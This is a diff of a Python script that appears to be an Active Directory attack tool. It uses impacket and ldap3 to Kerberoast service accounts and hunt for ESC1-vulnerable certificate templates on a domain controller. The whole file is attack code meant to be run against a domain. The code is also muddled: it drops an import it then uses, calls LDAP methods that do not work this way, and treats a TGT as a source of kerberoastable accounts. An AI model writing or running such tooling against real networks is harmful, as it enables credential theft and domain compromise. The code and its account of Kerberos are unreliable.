@@ -1,47 +1,95 @@
 from impacket.smbconnection import SMBConnection
-from impacket.krb5.asn1 import TGS_REP, Authenticator, AP_REQ, EncAPRepPart
-from impacket.krb5 import constants
-import dns.resolver
-import ldap3
 from impacket.krb5 import constants
 from impacket.krb5.asn1 import AP_REQ, TGS_REQ
 from impacket.krb5.types import Principal, KerberosTime, Ticket
 from impacket.ntlm import compute_lmhash, compute_nthash
 
-def get_ticket_for_user(username, password, domain, dc_ip):
-    # Connect to the Domain Controller via SMB
-    smb = SMBConnection(dc_ip, dc_ip)
-    smb.login(username, password, domain)
+def kerberos_auth(username, password, domain, dc_ip):
+    try:
+        # Create a connection to the domain controller
+        server = ldap3.Server(dc_ip, port=389)
+        conn = ldap3.Connection(server, user=f"{username}@{domain}", password=password)
+        conn.open()
 
-    # Get the TGT for the specified user
-    _, krbtgt_ticket = smb.getKerberosTGT(username, password, domain)
-    smb.logoff()
+        # Perform Kerberos authentication
+        conn.bind()
+        if conn.bound:
+            print("Kerberos authentication successful.")
+            return conn
+        else:
+            print("Kerberos authentication failed.")
+            return None
 
-    return krbtgt_ticket
+    except Exception as e:
+        print(f"Error during Kerberos authentication: {e}")
+        return None
 
 def kerberoast(domain, username, password, dc_ip):
     try:
-        print(f"Attempting to Kerberoast accounts from {dc_ip}")
+        conn = kerberos_auth(username, password, domain, dc_ip)
+        if conn:
+            print(f"Attempting to Kerberoast accounts from {dc_ip}")
 
-        # Get TGT ticket for the specified user
-        krbtgt_ticket = get_ticket_for_user(username, password, domain, dc_ip)
-
-        if krbtgt_ticket:
-            print("Successfully obtained krbtgt ticket.")
+            target = Principal(f'krbtgt/{domain}', type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+            krbtgt_ticket = get_ticket(username, password, domain, target, dc_ip, conn)
             
-            # Extract usernames of kerberoastable accounts from the TGT
-            kerberoastable_accounts = extract_kerberoastable_accounts(krbtgt_ticket)
-            if kerberoastable_accounts:
-                print("Kerberoastable Accounts:")
-                for account in kerberoastable_accounts:
-                    print(account)
+            if krbtgt_ticket:
+                print("Successfully obtained krbtgt ticket.")
+                
+                # Extract usernames of kerberoastable accounts from the TGT
+                kerberoastable_accounts = extract_kerberoastable_accounts(krbtgt_ticket)
+                if kerberoastable_accounts:
+                    print("Kerberoastable Accounts:")
+                    for account in kerberoastable_accounts:
+                        print(account)
+                else:
+                    print("No kerberoastable accounts found.")
             else:
-                print("No kerberoastable accounts found.")
-        else:
-            print("Failed to obtain krbtgt ticket.")
+                print("Failed to obtain krbtgt ticket.")
 
     except Exception as e:
         print(f"Error while Kerberoasting: {e}")
+
+def get_ticket(username, password, domain, target, dc_ip, conn):
+    try:
+        # Get TGT ticket
+        ccache = conn.sasl_gssapi_bind()
+        creds = ccache.credentials[0]
+
+        # Create AP-REQ message
+        ap_req = AP_REQ()
+        ap_req['pvno'] = 5
+        ap_req['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
+        ap_req['ap-options'] = 0
+        ap_req['ticket'] = creds.ticket
+        ap_req['authenticator'] = creds.ticket.authenticator
+
+        # Send TGS request for krbtgt ticket
+        tgs_req = TGS_REQ()
+        tgs_req['pvno'] = 5
+        tgs_req['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
+        tgs_req['padata'] = []
+        tgs_req['req-body'] = {
+            'kdc-options': 8,  # canonicalize
+            'sname': target,
+            'realm': domain,
+            'till': KerberosTime(0),
+            'etype': [23, 17, 18],  # RC4_HMAC, AES256, AES128
+        }
+        tgs_req['req-body']['cname'] = creds.ticket['cname']
+
+        conn.request(target, tgs_req)
+        response = conn.response
+        if response and len(response) > 0:
+            ticket = Ticket()
+            ticket.from_asn1(response[0]['response']['ticket'])
+            return ticket
+        else:
+            return None
+
+    except Exception as e:
+        print(f"Error while getting krbtgt ticket: {e}")
+        return None
 
 def extract_kerberoastable_accounts(tgt):
     try:
@@ -83,7 +131,6 @@ def find_esc1_certificate_templates(username, password, domain, dc_ip):
 
     except Exception as e:
         print(f"Error while searching for ESC1 certificate templates: {e}")
-
 
 # Example usage:
 username = input("Enter username: ")
